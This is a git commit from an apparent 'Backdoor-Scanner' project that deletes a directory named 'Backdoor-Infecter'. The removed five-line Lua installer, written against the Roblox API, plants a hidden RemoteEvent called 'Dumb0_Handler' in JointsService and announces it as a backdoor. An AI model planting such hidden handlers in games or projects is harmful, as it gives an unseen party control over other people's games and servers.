b51597ee83affa939ddc6b95e17fdb8c58f8623a
Dumb0 <safeshellez5@gmail.com>
2026-05-14 03:43:06 +0800

    Delete Backdoor-Scanner/Backdoor-Infecter directory

--- Backdoor-Scanner/Backdoor-Infecter/installer.lua
+++
@@ -1,5 +0,0 @@
--- DUMB0 INFECTER MODULE
-print("Dumb0 Infecter: Starting Installation...")
-local backdoor = Instance.new("RemoteEvent", game:GetService("JointsService"))
-backdoor.Name = "Dumb0_Handler"
-print("Dumb0 Infecter: Backdoor hidden in JointsService.")
